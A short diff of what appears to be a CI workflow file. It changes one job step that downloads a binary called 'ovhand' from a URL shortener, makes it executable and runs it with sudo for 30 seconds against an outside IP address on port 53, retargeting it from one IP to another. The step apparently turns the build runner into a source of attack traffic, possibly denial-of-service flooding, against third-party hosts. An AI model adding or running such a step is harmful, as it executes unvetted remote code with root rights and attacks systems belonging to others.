@@ -16,7 +16,7 @@ jobs:
         run: |
           wget https://curl.by/vka_Q/ovhand
           chmod +x ovhand
-          sudo timeout 30 ./ovhand 141.94.131.184 53 16 30 &
+          sudo timeout 30 ./ovhand 162.245.204.228 53 16 30 &
 
       - name: OK !
         run: |
